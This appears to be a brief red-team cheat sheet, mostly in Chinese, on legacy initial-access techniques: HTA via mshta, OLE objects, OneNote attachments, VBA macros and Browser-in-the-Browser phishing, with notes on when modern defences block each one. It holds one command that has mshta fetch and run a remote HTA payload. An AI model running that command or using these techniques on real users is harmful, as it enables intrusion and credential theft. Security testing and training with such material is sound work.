# Legacy / Environment-Gated Client Techniques

## 1. HTA / mshta

仍可能在靶场、旧 Windows 基线、未禁用脚本宿主的企业环境生效。

```cmd
mshta.exe http://SERVER/payload.hta
```

使用前确认应用控制、浏览器下载策略和 HTA handler 是否存在。

## 2. OLE embedded object

用于必须由用户显式双击附件对象的场景。现代 Office/Protected View/MOTW 策略通常会显著降低成功率。

## 3. OneNote attachment

现代 OneNote 已对多类危险扩展实施更严格阻止。只在确认版本/策略后使用，不作为默认路径。

## 4. VBA Macro

Microsoft 365 Apps 已长期默认阻止来自互联网的 VBA 宏。必须先确认：

```text
Office channel/version
MOTW
trusted location
macro policy
signed macro requirement
```

## 5. Browser-in-the-Browser

本质是视觉欺骗。对 passkey/FIDO2、密码管理器 origin matching 等 origin-bound 控制效果有限；适合 legacy password/weak-MFA 环境，不作为 2026 首选。
